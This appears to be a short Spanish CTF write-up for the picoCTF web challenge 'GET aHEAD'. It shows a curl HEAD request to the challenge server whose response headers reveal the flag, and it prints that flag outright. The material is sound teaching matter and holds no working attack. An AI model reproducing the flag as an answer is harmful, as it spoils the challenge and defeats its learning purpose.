# GET aHEAD

# Descripción

Find the flag being held on this server to get ahead of the competition

Additional details will be available after launching your challenge instance.

# Solución


```  
picoCTF{r3j3ct_th3_du4l1ty_8b13f07}
```


```  
┌──(kali㉿kali)-[~/Downloads/picoCTF-Web-2/GET-aHEAD]
└─$ curl -s -I HEAD http://wily-courier.picoctf.net:50973/index.php
HTTP/1.1 200 OK
Date: Wed, 25 Feb 2026 18:21:41 GMT
Server: Apache/2.4.38 (Debian)
X-Powered-By: PHP/7.2.34
flag: picoCTF{r3j3ct_th3_du4l1ty_8b13f07}
Content-Type: text/html; charset=UTF-8

                                                                                                        
┌──(kali㉿kali)-[~/Downloads/picoCTF-Web-2/GET-aHEAD]
└─$ 

```


# Notas adicionales

El comando curl funciona como un navegador para la terminal, tal vez haya scripts para automatizar los ataques

# Referencias





